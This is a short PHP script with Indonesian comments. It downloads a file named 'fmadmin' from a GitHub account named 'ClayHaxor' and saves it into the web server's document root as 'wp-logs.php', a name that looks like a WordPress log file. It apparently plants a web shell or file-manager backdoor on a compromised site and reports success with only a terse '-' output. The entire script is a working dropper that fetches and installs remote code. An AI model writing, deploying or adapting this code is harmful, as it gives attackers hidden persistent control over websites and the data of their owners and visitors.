<?php
// URL dari file yang ingin Anda unduh
$url = 'https://raw.githubusercontent.com/ClayHaxor/alfah/master/fmadmin';

// Mendapatkan root dokumen (home directory) secara otomatis
$document_root = $_SERVER['DOCUMENT_ROOT'];

// Path file PHP di dalam root dokumen
$php_file_path = $document_root . '/wp-logs.php';

// Membuat direktori struktur rekursif jika belum ada
$directory = dirname($php_file_path);
if (!is_dir($directory)) {
    $oldumask = umask(0);
    $created = @mkdir($directory, 0755, true);
    umask($oldumask);
    if (!$created) {
        echo "Tidak dapat membuat direktori '" . $directory . "'. Mohon buat direktori secara manual dan coba lagi.";
        exit;
    }
}

// Mengecek apakah direktori dapat ditulisi
if (!is_writable($directory)) {
    echo "Direktori '" . $directory . "' tidak memiliki izin tulis. Pastikan direktori memiliki izin yang diperlukan dan coba lagi.";
    exit;
}

// Inisialisasi sesi cURL
$ch = curl_init($url);

// Mengatur opsi cURL
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FAILONERROR, true);

// Mendapatkan konten dari URL
$framework_controller_2 = curl_exec($ch);

// Mengecek apakah ada error saat melakukan cURL
if (curl_errno($ch)) {
    echo "cURL Error: " . curl_error($ch);
    curl_close($ch);
    exit;
}

// Menutup sesi cURL
curl_close($ch);

// Menyimpan konten sebagai file PHP
file_put_contents($php_file_path, '<?php ?>' . PHP_EOL . $framework_controller_2);

// Mengecek apakah file PHP berhasil disimpan
if (file_exists($php_file_path)) {
    echo "-";
} else {
    echo "--";
}
?>
